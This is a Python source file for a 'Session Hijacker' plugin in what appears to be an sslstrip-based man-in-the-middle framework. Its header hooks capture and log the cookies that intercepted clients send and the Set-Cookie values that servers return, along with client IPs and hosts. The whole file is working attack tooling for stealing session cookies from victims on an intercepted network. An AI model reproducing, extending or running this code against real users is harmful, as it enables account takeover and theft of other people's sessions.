from plugins.plugin import Plugin
from sslstrip.URLMonitor import URLMonitor
import os
import argparse
import logging

class SessionHijacker(Plugin):
	name = "Session Hijacker"
	optname = "hijack"
	desc = "Performs session hijacking attacks against clients"
	implements = ["cleanHeaders", "handleHeader"]
	has_opts = False

	def initialize(self, options):
		'''Called if plugin is enabled, passed the options namespace'''
		self.options = options
		self.log_clients = options.clients
		self.urlMonitor = URLMonitor.getInstance()

		print "[*] Session Hijacker plugin online"

	def cleanHeaders(self, request): # Client => Server
		headers = request.getAllHeaders().copy()

		if 'cookie' in headers:
			message = "%s Got client cookie: [%s] %s" % (request.getClientIP(), headers['host'], headers['cookie'])
			if self.urlMonitor.isClientLogging() is True:
				self.urlMonitor.writeClientLog(request, headers, message)
			else:
				logging.info(message)

	def handleHeader(self, request, key, value): # Server => Client
		if 'set-cookie' in request.client.headers:
			cookie = request.client.headers['set-cookie']
			#host = request.client.headers['host']
			message = "%s Got server cookie: %s" % (request.client.getClientIP(), cookie)
			if self.urlMonitor.isClientLogging() is True:
				self.urlMonitor.writeClientLog(request.client, request.client.headers, message)
			else:
				logging.info(message)

	#def add_options(options):